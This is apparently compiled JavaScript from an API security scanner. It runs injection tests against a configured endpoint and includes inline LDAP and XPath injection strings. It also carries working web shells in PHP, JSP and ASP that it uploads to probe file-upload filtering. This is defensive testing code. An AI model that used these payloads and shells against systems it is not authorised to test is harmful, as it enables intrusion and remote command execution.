"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.InjectionTestSuite = void 0;
const base_test_suite_1 = require("./base-test-suite");
const sql_injection_1 = require("../payloads/sql-injection");
const nosql_injection_1 = require("../payloads/nosql-injection");
const command_injection_1 = require("../payloads/command-injection");
const xss_1 = require("../payloads/xss");
const path_traversal_1 = require("../payloads/path-traversal");
const xxe_1 = require("../payloads/xxe");
const template_injection_1 = require("../payloads/template-injection");
class InjectionTestSuite extends base_test_suite_1.BaseTestSuite {
    async runAllTests(endpoint, method, test) {
        const results = [];
        results.push(await this.testSQLInjection(endpoint, method, test));
        results.push(await this.testNoSQLInjection(endpoint, method, test));
        results.push(await this.testCommandInjection(endpoint, method, test));
        results.push(await this.testLDAPInjection(endpoint, method, test));
        results.push(await this.testXPathInjection(endpoint, method, test));
        results.push(await this.testXXE(endpoint, method, test));
        results.push(await this.testXSS(endpoint, method, test));
        results.push(await this.testTemplateInjection(endpoint, method, test));
        results.push(await this.testPathTraversal(endpoint, method, test));
        results.push(await this.testFileUploadSecurity(endpoint, method, test));
        results.push(await this.testTypeConfusion(endpoint, method, test));
        results.push(await this.testIntegerOverflow(endpoint, method, test));
        return results;
    }
    async testSQLInjection(endpoint, method, test) {
        const result = this.createBaseResult('SQL Injection Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            for (const payload of sql_injection_1.SQL_INJECTION_PAYLOADS.slice(0, 10)) {
                const body = { input: payload.payload, ...test?.body };
                const response = await this.makeRequest(url, method, headers, body);
                const responseText = await response.text();
                if (response.status === 200 && (responseText.toLowerCase().includes('sql') ||
                    responseText.toLowerCase().includes('mysql') ||
                    responseText.toLowerCase().includes('postgresql') ||
                    responseText.toLowerCase().includes('oracle') ||
                    responseText.toLowerCase().includes('syntax error') ||
                    responseText.toLowerCase().includes('sqlstate'))) {
                    securityIssues.push(`Potential SQL injection vulnerability: ${payload.description}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                payloadsTested: 10,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testNoSQLInjection(endpoint, method, test) {
        const result = this.createBaseResult('NoSQL Injection Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            for (const payload of nosql_injection_1.NOSQL_INJECTION_PAYLOADS.slice(0, 8)) {
                const payloadString = typeof payload.payload === 'string'
                    ? payload.payload
                    : (0, nosql_injection_1.nosqlPayloadToString)(payload.payload);
                const body = { input: payloadString, ...test?.body };
                const response = await this.makeRequest(url, method, headers, body);
                const responseText = await response.text();
                if (response.status === 200 && responseText.length > 0) {
                    securityIssues.push(`Potential NoSQL injection: ${payload.description}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                payloadsTested: 8,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testCommandInjection(endpoint, method, test) {
        const result = this.createBaseResult('Command Injection Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            for (const payload of command_injection_1.COMMAND_INJECTION_PAYLOADS.slice(0, 10)) {
                const body = { input: payload.payload, ...test?.body };
                const response = await this.makeRequest(url, method, headers, body);
                const responseText = await response.text();
                if (response.status === 200 && (responseText.includes('uid=') ||
                    responseText.includes('gid=') ||
                    responseText.includes('total ') ||
                    responseText.includes('Directory of'))) {
                    securityIssues.push(`Potential command injection: ${payload.description}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                payloadsTested: 10,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testLDAPInjection(endpoint, method, test) {
        const result = this.createBaseResult('LDAP Injection Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            const ldapPayloads = [
                '*',
                ')(&',
                '*)(uid=*',
                '*)(|(uid=*',
                'admin)(&(password=*',
            ];
            for (const payload of ldapPayloads) {
                const body = { input: payload, ...test?.body };
                const response = await this.makeRequest(url, method, headers, body);
                const responseText = await response.text();
                if (response.status === 200 && responseText.length > 0) {
                    securityIssues.push(`Potential LDAP injection: ${payload}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                payloadsTested: ldapPayloads.length,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testXPathInjection(endpoint, method, test) {
        const result = this.createBaseResult('XPath Injection Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            const xpathPayloads = [
                "' or '1'='1",
                "' or 1=1 or ''='",
                "') or ('1'='1",
                "' or 1=1--",
            ];
            for (const payload of xpathPayloads) {
                const body = { input: payload, ...test?.body };
                const response = await this.makeRequest(url, method, headers, body);
                const responseText = await response.text();
                if (response.status === 200 && responseText.length > 0) {
                    securityIssues.push(`Potential XPath injection: ${payload}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                payloadsTested: xpathPayloads.length,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testXXE(endpoint, method, test) {
        const result = this.createBaseResult('XXE Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            headers['Content-Type'] = 'application/xml';
            for (const payload of xxe_1.XXE_PAYLOADS.slice(0, 5)) {
                const response = await this.makeRequest(url, method, headers, payload.payload);
                const responseText = await response.text();
                if (response.status === 200 && (responseText.includes('root:') ||
                    responseText.includes('127.0.0.1') ||
                    responseText.includes('localhost'))) {
                    securityIssues.push(`Potential XXE vulnerability: ${payload.description}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                payloadsTested: 5,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testXSS(endpoint, method, test) {
        const result = this.createBaseResult('XSS Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            for (const payload of xss_1.XSS_PAYLOADS.slice(0, 10)) {
                const body = { input: payload.payload, ...test?.body };
                const response = await this.makeRequest(url, method, headers, body);
                const responseText = await response.text();
                if (response.status === 200 && responseText.includes(payload.payload)) {
                    securityIssues.push(`Potential XSS vulnerability: ${payload.description}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                payloadsTested: 10,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testTemplateInjection(endpoint, method, test) {
        const result = this.createBaseResult('Template Injection Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            for (const payload of template_injection_1.TEMPLATE_INJECTION_PAYLOADS.slice(0, 8)) {
                const body = { input: payload.payload, ...test?.body };
                const response = await this.makeRequest(url, method, headers, body);
                const responseText = await response.text();
                if (response.status === 200 && (responseText.includes('49') ||
                    responseText.includes('eval') ||
                    responseText.includes('exec'))) {
                    securityIssues.push(`Potential template injection: ${payload.description}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                payloadsTested: 8,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testPathTraversal(endpoint, method, test) {
        const result = this.createBaseResult('Path Traversal Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            for (const payload of path_traversal_1.PATH_TRAVERSAL_PAYLOADS.slice(0, 10)) {
                const body = { file: payload.payload, ...test?.body };
                const response = await this.makeRequest(url, method, headers, body);
                const responseText = await response.text();
                if (response.status === 200 && (responseText.includes('root:') ||
                    responseText.includes('127.0.0.1') ||
                    responseText.includes('localhost') ||
                    responseText.includes('Windows'))) {
                    securityIssues.push(`Potential path traversal: ${payload.description}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                payloadsTested: 10,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testFileUploadSecurity(endpoint, method, test) {
        const result = this.createBaseResult('File Upload Security Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            const maliciousFiles = [
                { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>' },
                { name: 'shell.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
                { name: 'shell.jspx', content: '<jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter("cmd"));</jsp:scriptlet>' },
                { name: 'shell.asp', content: '<% eval request("cmd") %>' },
            ];
            for (const file of maliciousFiles) {
                const formData = new FormData();
                formData.append('file', new Blob([file.content], { type: 'text/plain' }), file.name);
                const response = await this.makeRequest(url, method, headers, formData);
                if (response.status === 200) {
                    securityIssues.push(`Potentially dangerous file type accepted: ${file.name}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                filesTested: maliciousFiles.length,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testTypeConfusion(endpoint, method, test) {
        const result = this.createBaseResult('Type Confusion Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            const typeConfusionPayloads = [
                { id: '0' },
                { id: 0 },
                { id: null },
                { id: [] },
                { id: {} },
                { id: true },
            ];
            for (const payload of typeConfusionPayloads) {
                const body = { ...payload, ...test?.body };
                const response = await this.makeRequest(url, method, headers, body);
                if (response.status === 200) {
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                payloadsTested: typeConfusionPayloads.length,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
    async testIntegerOverflow(endpoint, method, test) {
        const result = this.createBaseResult('Integer Overflow Test', endpoint, method);
        const startTime = Date.now();
        const securityIssues = [];
        try {
            const url = `${this.config.baseUrl}${endpoint}`;
            const headers = this.buildHeaders(test);
            const boundaryValues = [
                Number.MAX_SAFE_INTEGER,
                Number.MAX_SAFE_INTEGER + 1,
                Number.MIN_SAFE_INTEGER,
                Number.MIN_SAFE_INTEGER - 1,
                2147483647,
                2147483648,
                -2147483648,
                -2147483649,
            ];
            for (const value of boundaryValues) {
                const body = { id: value, ...test?.body };
                const response = await this.makeRequest(url, method, headers, body);
                if (response.status === 500) {
                    securityIssues.push(`Potential integer overflow/underflow with value: ${value}`);
                }
            }
            result.responseTime = Date.now() - startTime;
            result.securityIssues = securityIssues.length > 0 ? securityIssues : undefined;
            result.passed = securityIssues.length === 0;
            result.details = {
                valuesTested: boundaryValues.length,
                issuesFound: securityIssues.length,
            };
        }
        catch (error) {
            result.passed = false;
            result.error = error.message;
            result.details = { error: error.message };
        }
        return result;
    }
}
exports.InjectionTestSuite = InjectionTestSuite;
//# sourceMappingURL=injection-test-suite.js.map